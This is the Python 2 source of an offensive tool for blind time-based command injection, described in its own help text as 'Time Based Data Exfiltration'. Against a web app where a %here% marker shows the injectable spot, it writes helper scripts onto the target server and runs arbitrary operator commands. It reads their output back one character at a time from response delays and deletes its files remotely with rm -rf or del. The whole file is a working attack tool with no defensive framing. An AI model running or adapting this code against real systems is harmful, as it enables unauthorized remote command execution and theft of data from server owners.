import pycurl,sys,threading,Queue,time,argparse,json
from StringIO import StringIO
from urllib import quote_plus
from urlparse import urlparse

retry=3
avg_request=0
write_tmp=False
q=Queue.Queue()
threads=10
start_time=time.time()
rm_timeout=2
os="U"
headers=[]
method="GET"
post=""
len_headers=0
headers_injection=[]
timeout=10
working=False
done=0
def parse_headers(request_file):
	global headers,method,post,url,len_headers
	f=open(request_file,'r').read().splitlines()
	sp=f[0].split(" ")[1]
	url=url+sp[1:]
	if 'POST' in f[0]:
		post=f[-1]
		method="POST"
	for i in f[1:]:
		if 'host' not in i.lower() and 'accept-encoding' not in i and 'connection' not in i :
			headers.append(i)
	for j,i in enumerate(headers):
		if '%here%' in i:
			headers_injection.append(j)
	len_headers=len(headers)

class request():
	def __init__(self,payload,find_length=True,write_cmd=False):
		if not write_cmd:
			if write_tmp:
				if os=="U":
					if find_length:
						self.payload='python /tmp/l.py '+payload+" 1"
					else:
						self.payload='python /tmp/c.py '+payload+" 1"
				else:
					if find_length:
						self.payload='c:/windows/temp/l '+payload+" 1"
					else:
						self.payload='c:/windows/temp/c '+payload+" 1"
			else:
				if os=="U":
					if find_length:
						self.payload='python l.py '+payload+" 0"
					else:
						self.payload='python c.py '+payload+" 0"
				else:
					if find_length:
						self.payload='l '+payload+" 0"
					else:
						self.payload='c '+payload+" 0"
			self.payload+=" "+str(avg_request)
		else:
			self.payload=payload
		#print self.payload
		if len(headers_injection)==0:
			self.payload=quote_plus(self.payload)			
	def execute(self):
		last_error=""
		for i in range(retry):
			try:
				p=pycurl.Curl()
				html=StringIO()
				p.setopt(p.URL, url.replace("%here%",self.payload))
				if len_headers==0:
					p.setopt(p.USERAGENT,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
				else:
					tm_headers=headers
					for i in headers_injection:
						tm_headers[i]=tm_headers[i].replace('%here%',self.payload)
					p.setopt(p.HTTPHEADER,headers)
				p.setopt(p.COOKIEJAR,cook)
				p.setopt(p.COOKIEFILE,cook)
				p.setopt(p.SSL_VERIFYPEER,0)
				p.setopt(p.SSL_VERIFYHOST,0)
				if method=="POST":
					p.setopt(p.POST,1)
					p.setopt(p.POSTFIELDS,post.replace("%here%",self.payload))
				p.setopt(p.TIMEOUT,timeout)
				p.setopt(p.WRITEFUNCTION,html.write)
				p.perform()
				rez=html.getvalue()
				time=p.getinfo(p.TOTAL_TIME)
				p.close()
				html.close()
				return (time,rez)
			except Exception,e:
				last_error=str(e)
				continue
		print last_error
		if 'timed out' in last_error:
			return (-1,None)
		else:
			return (-2,None)
class find(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
	def search_interval(self,c,start,stop,step=10):
		eq=False
		times=0
		while start<=stop and start>0:
			#print "[-] %s %s"%(c,start)
			if eq:
				payload=str(c)+" "+str(start)+" 1"
			else:
				payload=str(c)+" "+str(start)+" 0"

			rez=request(payload,False).execute()
			#print rez
			
			if rez[0]>avg_request:
				#print 1
				if eq:
					return start
				eq=True
			else:
				if times>step:
					return 0
				if eq:
					times+=1
					start-=1
				else:
					start+=10
		return 0
	def run(self):
			global q,results,done

			while True:
				c=q.get()
				#print rez
				rez=self.search_interval(c,32,126)
				if rez==0:
					rez=self.search_interval(c,32,126)
					if rez==0:
						results[c]=rez
				else:
					results[c]=rez

				done+=1							
				q.task_done()
class Watcher(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		last=""
		while working:
			final=""
			remaining=[]
			for j,i in enumerate(results):
				if i==-1:
					final+="?"
					remaining.append(j)
				else:
					final+= chr(i)
			if last!=final:
				last=final
				tmp_logger=open('tmp_logger.txt','w')
				tmp_logger.write(final)
				tmp_logger.close()
			time.sleep(10)
def write_command(cmd):
	print '[+] Writing command output to file'
	if write_tmp:
		payload=cmd+">/tmp/l"
	else:
		payload=cmd+">l"
	rez=request(payload,write_cmd=True).execute()
def count_length():
	cont=0
	eq=False
	times=0
	timedout=False
	while True:
		sys.stdout.write('\r[+] Counting output length = %s '%str(cont))
		if eq:
			payload=str(cont)+" 1"
		else:
			payload=str(cont)+" 0"
		rez=request(payload).execute()

		if rez[0]==-2:
			print '\n[!] Network error, exiting'
			return 0
		elif rez[0]>avg_request:
			#print 1
			if eq:
				print '\n[+] Found output length = '+str(cont)
				return cont
			eq=True
		else:
			if times>10:
				print '\n[!] Can\'t find the output length'
				return 0
			if eq:
				cont-=1
				times+=1
			else:
				cont+=10
def write_aux_files(filename,to,maxlength=None):

	filen=open(filename).read()
	if maxlength==None:
		if os=="U":
			if write_tmp:
				cmd="echo \""+filen+"\">/tmp/"+to
			else:
				cmd="echo \""+filen+"\">"+to
		else:
			if write_tmp:
				cmd="echo ^"+filen+"^ >c:/windows/temp/"+to
			else:
				cmd="echo ^"+filen+"^ >"+to
		request(cmd,write_cmd=True).execute()		
	else:
		maxlength=int(maxlength)
		lines=open(filename).read().splitlines()
		if write_tmp:		
			maximum=maxlength-21
		else:
			maximum=maxlength-21
		for j,l in enumerate(lines):
			print '[+] Writing line '+str((j+1))
			if len(l)<=maximum:
				if os=="U":
					if write_tmp:
						cmd="echo \""+l+"\">>/tmp/"+to
					else:
						cmd="echo \""+l+"\">>"+to
				else:
					if write_tmp:
						cmd="echo ^"+l+"^ >>c:/windows/temp/"+to
					else:
						cmd="echo ^"+l+"^ >>"+to					
				request(cmd,write_cmd=True).execute()
			else:
				total=len(l)
				i=0
				while i<=total:
					if os=="U":
						if write_tmp:
							if i+maximum>=total:
								cmd="echo \""+l[i:(i+maximum)]+"\">>/tmp/"+to
							else:
								cmd="echo -n \""+l[i:(i+maximum)]+"\">>/tmp/"+to							
						else:
							if i+maximum>=total:
								cmd="echo \""+l[i:(i+maximum)]+"\">>"+to
							else:
								cmd="echo -n \""+l[i:(i+maximum)]+"\">>"+to
					else:
						if write_tmp:
							if i+maximum>=total:
								cmd="echo ^"+l[i:(i+maximum)]+"^ >>c:/windows/temp/"+to
							else:
								cmd="echo|set /p=\""+l[i:(i+maximum)]+"\" >>c:/windows/temp/"+to							
						else:
							if i+maximum>=total:
								cmd="echo ^"+l[i:(i+maximum)]+"^ >>"+to
							else:
								cmd="echo|set /p=\""+l[i:(i+maximum)]+"\" >>"+to	
					#print cmd					
					request(cmd,write_cmd=True).execute()

					i+=maximum			
	#request(payload,write_cmd=True).execute()
def start_writing(limit):
	if limit==-1:
		limit=None
	if os=="U":
		print '[+] Writing the "length" file'
		write_aux_files('length.py','l.py',limit)
		print '[+] Writing the "ascii" file'
		write_aux_files('ascii.py','c.py',limit)
	else:
		print '[+] Writing the "ascii" files'
		write_aux_files('ascii.bat','c.bat',limit)
		write_aux_files('l.ps1','l.ps1',limit)
		print '[+] Writing the "length" files'
		write_aux_files('length.bat','l.bat',limit)
		write_aux_files('s.ps1','s.ps1',limit)
def check_file():
	print '[+] Testing the auxiliary files'
	
	if os=="W":
		write_command("echo abcd")
	else:
		write_command("echo -n abcd")
	rez=request("4 1").execute()
	
	if rez[0]==-2:
		print '[!] Network error, exiting'
		return 0
	elif rez[0]>avg_request:
		print '[+] "length" file OK, returned delay'
	else:
		print '[!] "length" file didn\'t return delay, exiting'
		return 0
	rez=request("0 97 1",False).execute()			
	if rez[0]==-2:
		print '[!] Network error, exiting'
		return 0
	elif rez[0]>avg_request:
		print '[+] "ascii" file OK, returned delay'
		return 1
	else:
		print '[!] "ascii" file didn\'t return delay, exiting'
		return 0

def main():
	global cook,url,post,write_tmp,threads,avg_request,os,timeout,host,working,q,results,done
	parser = argparse.ArgumentParser(description='Time Based Data Exfiltration')
	parser.add_argument('-url', action='store',dest='url',default="",help='URL')
	parser.add_argument('-post', action='store',dest='post',default="",help='POST')
	parser.add_argument('-threads', action='store',default=10,dest='threads',help='Threads')
	parser.add_argument('-cookie', action='store',dest='cookie_file',default="cookies.txt",help='Cookie File')
	parser.add_argument('-file', action='store',dest='header_file',default="",help='Burp request file')
	parser.add_argument('-retry', action='store',dest='retry',default=3,help='Retry request N times in case of network errors')
	parser.add_argument('-timeout', action='store',dest='timeout',default=10,help='General timeout request')
	parser.add_argument('-time', action='store',dest='avgtime',default=4,help='Added timeout to request')
	parser.add_argument('-os', action='store',dest='os',default="U",help='OS type (U unix/linux , W windows)')
	parser.add_argument('-payload_limit', action='store',dest='limit',default=-1,help='If there is any command length limitation')
	parser.add_argument('-force_write', action='store_true',default=False,dest='writing',help='Force writing auxiliary files')
	parser.add_argument('-tmp', action='store_true',default=False,dest='tmp',help='Writing auxiliary files in tmp folder')
	results = parser.parse_args()
	#results.url
	if results.url=="":
		print 'No url suplied, please see -h'
	else:
		
		cook=results.cookie_file
		url=results.url
		post=results.post
		write_tmp=results.tmp
		threads=int(results.threads)
		os=results.os
		if post!="":
			method="POST"
		else:
			method="GET"
		timeout=int(results.timeout)
		if results.header_file!="":
			parse_headers(results.file)
		try:
			cache=open('cache.txt').read()
			cache=json.loads(cache)
		except:
			cache={}
		host=urlparse(url).netloc
		avg_request=int(results.avgtime)
		#print avg_request
		if host not in cache:
			cache[host]={"auxiliary_files":False,"last_cmd":""}
			open('cache.txt','w').write(json.dumps(cache))
			start_writing(results.limit)
			ok=check_file()
			if ok:
				cache[host]['auxiliary_files']=True
				open('cache.txt','w').write(json.dumps(cache))
			else:
				cache[host]['auxiliary_files']=False
				open('cache.txt','w').write(json.dumps(cache))
				print '[!] Failed to write auxiliary files to the remote host. Try again using -tmp.'
				sys.exit(0)
		else:
			if cache[host]['auxiliary_files']==False:					
				start_writing(results.limit)
				ok=check_file()
				if ok:
					cache[host]['auxiliary_files']=True
					open('cache.txt','w').write(json.dumps(cache))
				else:
					cache[host]['auxiliary_files']=False
					open('cache.txt','w').write(json.dumps(cache))
					print '[!] Failed to write auxiliary files to the remote host. Try again using -tmp.'
					sys.exit(0)
			else:

				if results.writing:
					print '[+] Deleting the old files'
					if os=="U":
						if write_tmp:
							request('rm -rf /tmp/l.py /tmp/c.py',write_cmd=True).execute()
						else:
							request('rm -rf l.py c.py',write_cmd=True).execute()
					else:
						if write_tmp:
							request('del c:/windows/temp/c',write_cmd=True).execute()
							request('del c:/windows/temp/l',write_cmd=True).execute()
							request('del c:/windows/temp/s.ps1',write_cmd=True).execute()
							request('del c:/windows/temp/l.ps1',write_cmd=True).execute()
						else:
							request('del c l s.ps1 l.ps1',write_cmd=True).execute()
					start_writing(results.limit)
					ok=check_file()
					if ok:
						cache[host]['auxiliary_files']=True
						open('cache.txt','w').write(json.dumps(cache))
					else:
						print '[!] Failed to write auxiliary files to the remote host. Try again using -tmp.'
						sys.exit(0)
				else:
					ok=check_file()
					if not ok:
						cache[host]['auxiliary_files']=False
						open('cache.txt','w').write(json.dumps(cache))
						print '[!] Failed to verify the auxiliary files'
						sys.exit(0)
		print '[+] Available commands:\n!exit - exit the program\n!rewrite - rewrite the auxiliary files\n!resume - resume the last command or try to guess unknown chars\n!check - check if the auxiliary files are working'
		print '\nCommand examples:\nuname -a\nuname -a{4-10} extract the output of the command starting from 4th character up to 10th\nuname -a{10,20,13} extract characters 10, 20 and 13'
		while True:
			cmd=raw_input('command>')
			if cmd=="!exit":
				break
			elif cmd=="!rewrite":
				if results.writing:
					print '[+] Deleting the old files'
					if os=="U":
						if write_tmp:
							request('rm -rf /tmp/l.py /tmp/c.py',write_cmd=True).execute()
						else:
							request('rm -rf l.py c.py',write_cmd=True).execute()
					else:
						if write_tmp:
							request('del c:/windows/temp/c',write_cmd=True).execute()
							request('del c:/windows/temp/l',write_cmd=True).execute()
							request('del c:/windows/temp/s.ps1',write_cmd=True).execute()
							request('del c:/windows/temp/l.ps1',write_cmd=True).execute()
						else:
							request('del c l s.ps1 l.ps1',write_cmd=True).execute()
					start_writing(results.limit)
					ok=check_file()
					if ok:
						cache[host]['auxiliary_files']=True
						open('cache.txt','w').write(json.dumps(cache))
					else:
						print '[!] Failed to write auxiliary files to the remote host. Try again using -tmp.'
						sys.exit(0)
				else:
					ok=check_file()
					if not ok:
						cache[host]['auxiliary_files']=False
						open('cache.txt','w').write(json.dumps(cache))
						print '[!] Failed to verify the auxiliary files'
						sys.exit(0)
			elif cmd=="!resume":
				cmd=cache[host]['last_cmd']
				chose=[]
				if "{" in cmd and "}" in cmd:
					sp=cmd.split("{")
					cmd=sp[0]

				write_command(cmd)
				tmp=open('tmp_logger.txt').read()
				results=[-1]*len(tmp)
				remaining=[]
				for i,t in enumerate(tmp):
					if t=="?":
						results[i]=-1
						remaining.append(i)
					else:
						results[i]=ord(t)
				for i in range(threads):
					t=find()
					t.daemon=True
					t.start()
				working=True
				Watcher().start()
				for i in remaining:
					#print i
					q.put(i)
				last=""
				tt=len(remaining)
				while done<tt:
					display=""
					for i in results:
						if i==-1:
							display+="?"
						else:
							display+= chr(i)
					if last!=display:
						last=display
						sys.stdout.write('\r')
						sys.stdout.write(display+" ")
						sys.stdout.flush()
					time.sleep(0.5)
				q.join()			
				working=False
				final=""
				sys.stdout.write('\r')
				sys.stdout.flush()
				for i in results:
					if i==-1:
						final+= "?"
					else:
						final+= chr(i)
				print final
				tmp_logger=open('tmp_logger.txt','w')
				tmp_logger.write(final)
				tmp_logger.close()
				logger=open(host+".log",'a').write('['+time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())+'] > '+cmd+'\n\n'+final+'\n')
				print 'Took %2fs'%(time.time()-start_time)				
			elif cmd=="!check":
				ok=check_file()
				if ok:
					cache[host]['auxiliary_files']=True
					open('cache.txt','w').write(json.dumps(cache))
				else:
					cache[host]['auxiliary_files']=False
					open('cache.txt','w').write(json.dumps(cache))
					print '[!] Failed to check auxiliary files from the remote host'
					sys.exit(0)
			else:
				chose=[]
				if "{" in cmd and "}" in cmd:
					sp=cmd.split("{")
					cmd=sp[0]
					intverval_split=sp[1].split("}")[0]
					if "-" in intverval_split:
						minmax=intverval_split.split("-")
						chose=range(int(minmax[0]),int(minmax[1])+1)
					else:
						items=intverval_split.split(",")
						for i in items:
							chose.append(int(i))
				cache[host]['last_cmd']=cmd
				open('cache.txt','w').write(json.dumps(cache))
				write_command(cmd)
				start_time=time.time()
				cont=count_length()
				if cont>0:
					done=0
					working=True
					results=[-1]*cont
					for i in range(threads):
						t=find()
						t.daemon=True
						t.start()
					Watcher().start()
					if len(chose)>0:
						for c in chose:
							q.put(c)
					else:
						for i in range(cont):
							#print i
							q.put(i)
					last=""
					if len(chose)>0:
						cont=len(chose)
					while done<cont:
						try:
							if cont>90:
								if last=="":
									last=0
								if done!=last:
									last=done
									sys.stdout.write('\r')
									sys.stdout.write('[+] Done %s / %s '%(done,cont))
									sys.stdout.flush()								
							else:
								display=""
								for i in results:
									if i==-1:
										display+="?"
									else:
										display+= chr(i)
								if last!=display:
									last=display
									sys.stdout.write('\r')
									sys.stdout.write(display+" ")
									sys.stdout.flush()
							time.sleep(0.5)
						except:
							print '%s - %s'%(done,cont)
					q.join()			
					working=False
					final=""
					sys.stdout.write('\r')
					sys.stdout.flush()
					for i in results:
						if i==-1:
							final+= "?"
						else:
							final+= chr(i)
					print final
					tmp_logger=open('tmp_logger.txt','w')
					tmp_logger.write(final)
					tmp_logger.close()
					logger=open(host+".log",'a').write('['+time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())+'] > '+cmd+'\n\n'+final+'\n')
					print 'Took %2fs'%(time.time()-start_time)
				else:
					print '[!] Failed to guess the length of the string' 
if __name__=="__main__":
	main()